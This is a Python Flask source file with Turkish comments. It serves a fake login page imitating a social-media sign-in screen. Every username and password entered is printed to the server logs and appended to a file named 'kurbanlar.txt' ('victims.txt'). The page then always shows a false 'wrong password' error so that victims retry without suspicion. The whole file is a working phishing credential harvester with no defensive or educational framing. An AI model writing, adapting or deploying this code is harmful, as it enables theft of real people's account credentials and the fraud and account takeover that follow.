import os
from flask import Flask, request, render_template_string

app = Flask(__name__)

HTML_TASARIM = """
<!DOCTYPE html>
<html>
<head>
    <title>Giris Yap</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
        .login-container { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .error { color: red; font-size: 14px; text-align: center; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2 style="text-align:center">Giris Yap</h2>
        {% if hata %}
            <p class="error">Sifre yanlis. Lutfen tekrar deneyin.</p>
        {% endif %}
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="E-posta veya Telefon" required>
            <input type="password" name="password" placeholder="Sifre" required>
            <button type="submit">Giris Yap</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TASARIM)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')
    
    # BU SATIR SAYESİNDE ŞİFRELERİ RENDER "LOGS" EKRANINDA GÖRECEKSİN:
    print(f"--- VERI GELDI --- Kullanici: {user} | Sifre: {pw}")
    
    # Dosyaya kaydetme kısmı
    with open("kurbanlar.txt", "a") as f:
        f.write(f"Kullanici: {user} | Sifre: {pw}\n")
    
    return render_template_string(HTML_TASARIM, hata=True)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
